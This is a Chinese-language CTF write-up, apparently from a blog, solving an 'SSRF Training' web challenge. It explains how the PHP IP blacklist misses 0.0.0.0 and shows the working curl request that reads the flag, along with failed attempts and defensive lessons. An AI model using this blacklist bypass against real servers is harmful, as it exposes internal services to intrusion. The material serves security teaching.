---
title: "SSRF Training"
date: 2026-07-22
categories:
  - CTF
  - WEB
tags:
  - CTF
  - SSRF
  - PHP
  - IP 黑名单绕过
---

# 1. 题目分析

目标：`https://a8d21387f111661654691c3f.http-ctf2.dasctf.com/`

首页标题为 **SSRF Training**，提供一个 `url` 输入框；页面还直接给出两个关键提示：`flag.php` 和 `302.php post url`。初步判断是读取本机 `flag.php` 的 SSRF 题。

```http
HTTP/2 200
server: openresty
x-powered-by: PHP/5.6.40
content-type: text/html; charset=UTF-8
```

`openresty` 表示前端为 Nginx/OpenResty，`PHP/5.6.40` 表明后端是较旧的 PHP 环境；重点转向 PHP 对 URL 和 IPv4 地址的处理差异。

# 2. 信息收集

## 2.1 首页与交互点

```bash
curl -s -i 'https://a8d21387f111661654691c3f.http-ctf2.dasctf.com/'
```

页面中的表单为：

```html
<form method="post">
  <input name="url">
</form>
```

同时存在源码入口：

```html
<a href="challenge.php">intersting challenge</a>
```

## 2.2 获取源码

```bash
curl -s -i 'https://a8d21387f111661654691c3f.http-ctf2.dasctf.com/challenge.php'
```

`challenge.php` 通过 `highlight_file(__FILE__)` 直接泄露源码。关键逻辑整理如下：

```php
$url_parse = parse_url($url);
$hostname = $url_parse['host'];
$ip = gethostbyname($hostname);
$int_ip = ip2long($ip);

return ip2long('127.0.0.0') >> 24 == $int_ip >> 24
    || ip2long('10.0.0.0') >> 24 == $int_ip >> 24
    || ip2long('172.16.0.0') >> 20 == $int_ip >> 20
    || ip2long('192.168.0.0') >> 16 == $int_ip >> 16;
```

其中第一条：

```php
ip2long('127.0.0.0') >> 24 == $int_ip >> 24
```

可拆开理解：

```php
// ip2long('127.0.0.0') = 0x7f000000
// 右移 24 位后仅保留最高 8 位，结果为十进制 127
$expected = ip2long('127.0.0.0') >> 24;

// 对目标 IP 同样右移 24 位，取出其第一个八位组
$actual = $int_ip >> 24;

// 两者相等，即目标 IP 的首段为 127
// 等价于判断目标是否属于 127.0.0.0/8（整个 IPv4 回环网段）
return $expected == $actual;
```

例如 `127.42.3.28` 转换为整数后右移 24 位仍为 `127`，会被拦截；`0.0.0.0` 的转换结果为 `0`，右移后仍为 `0`，因此不满足该条件。后面三条分别以相同方式检查 `10.0.0.0/8`、`172.16.0.0/12`（右移 20 位保留前 12 位）和 `192.168.0.0/16`。

通过检测后，程序会用 cURL 请求用户 URL：

```php
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$output = curl_exec($ch);
var_dump($output);
```

实际参数来自 `$_GET['url']`，故应使用 `challenge.php?url=...`，而不是首页表单表现出来的 POST。

# 3. 漏洞分析（含推理链和失败路径）

## 3.1 推理链

```text
源码泄露
  ↓
发现仅通过 IPv4 黑名单拦截 127/8、10/8、172.16/12、192.168/16
  ↓
假设：未覆盖的 0.0.0.0 能被 cURL 当作本机地址连接
  ↓
PHP gethostbyname('0.0.0.0') / ip2long('0.0.0.0') 得到 0
  ↓
0 不属于任一被拦截网段，校验放行
  ↓
cURL 请求 http://0.0.0.0/flag.php，连接到靶机本地 Web 服务
  ↓
flag.php 响应被 var_dump 输出，成功得到 Flag
```

## 3.2 漏洞根因

黑名单遗漏了 `0.0.0.0/8`。在 IPv4 语义中，`0.0.0.0` 是未指定地址；但作为客户端连接的目的地址时，常会被操作系统解释/路由为本机。过滤器只看 `gethostbyname()` 后的数值是否落在四段私网或回环网段，未将它作为危险地址处理，导致校验结果和最终网络连接的安全语义不一致。

```text
攻击 URL: http://0.0.0.0/flag.php

parse_url()            gethostbyname() / ip2long()       cURL
┌─────────────┐        ┌──────────────────────────┐      ┌────────────────────┐
│ host=0.0.0.0│ ─────▶ │ 0，不命中四条黑名单规则      │ ───▶ │ 连接本机:80         │
└─────────────┘        └──────────────────────────┘      │ 请求 /flag.php     │
                                                           └─────────┬──────────┘
                                                                     │
                                                               返回 flag 内容
```

题目还放置了 `302.php`：对其 POST `url=http://127.0.0.1/flag.php` 时，确实会返回 `302 Location: http://127.0.0.1/flag.php`。并且主程序会读取 `redirect_url` 并递归调用 `safe_request_url()`。这是另一个值得注意的危险设计；不过递归前仍会重新经过同一内网检测，因此本题不需要它，`0.0.0.0` 直连即可完成利用。

## 3.3 尝试过但失败的路径

| 尝试 | 预期 | 实际结果 | 得出的结论 |
|---|---|---|---|
| 访问 `/302.php` | 获得默认跳转 | `200` 空响应 | 端点需要提交 POST 参数 |
| `POST /302.php`，`url=http://127.0.0.1/flag.php` | 构造跳板 | 返回 `302 Location: http://127.0.0.1/flag.php` | 页面提示有效，但不能直接作为无状态 GET 跳板 |
| `/302.php?url=...` | 以 GET 设置跳转目标 | `200` 空响应 | 参数只从 POST 读取 |
| `http://0/flag.php` | 用简写 0 绕过黑名单并读 flag | SSRF 到达内部 Apache，但返回 `400 Bad Request`，Host 为 `0` | SSRF 已成立；需要兼顾内部虚拟主机可接受的 Host 格式 |
| `http://127.0.0.1/flag.php` | 直接读本机 flag | 被判定为 `inner ip` | 127/8 黑名单生效 |

# 4. 漏洞利用

最小验证与最终利用请求相同：

```bash
curl -s --max-time 15 \
  'https://a8d21387f111661654691c3f.http-ctf2.dasctf.com/challenge.php?url=http%3A%2F%2F0.0.0.0%2Fflag.php'
```

响应末尾：

```text
string(40) "n1book{ug9thaevi2JoobaiLiiLah4zae6fie4r}"
```

# 5. Flag

```text
n1book{ug9thaevi2JoobaiLiiLah4zae6fie4r}
```

# 6. 知识点总结

1. SSRF 防护不能只维护少量私网黑名单，必须同时拒绝回环、未指定地址、链路本地地址、IPv6 本地地址与云元数据地址等特殊目标。
2. 要在 DNS 解析后对**实际连接的 IP**做严格 allowlist 校验，并防范 DNS Rebinding；仅在请求前用 `gethostbyname()` 检查是不够的。
3. 使用安全的 HTTP 客户端策略：禁用或严格审查重定向、限制协议/端口，并在每次跳转后重新验证目标。
4. 在有虚拟主机的内部服务中，SSRF URL 的 host 同时影响 TCP 连接目标和 HTTP `Host` 头。`0` 与 `0.0.0.0` 都可到达本机，但后者能被本题的内部服务正常处理。
5. 生产环境不应暴露 `highlight_file(__FILE__)` 等源码查看功能。

# 7. 解题链路总结图

```text
访问首页
  ↓
发现 SSRF Training、flag.php 和 challenge.php
  ↓
访问 challenge.php 获取 PHP 源码
  ↓
确认 URL 取自 GET，且使用 IPv4 黑名单
  ↓
测试 127.0.0.1：被拦截
  ↓
发现遗漏的 0.0.0.0/8
  ↓
http://0/flag.php：到达内部服务但 Host=0 导致 400
  ↓
http://0.0.0.0/flag.php：绕过校验且 Host 可用
  ↓
读取 /flag.php
  ↓
获得 Flag
```
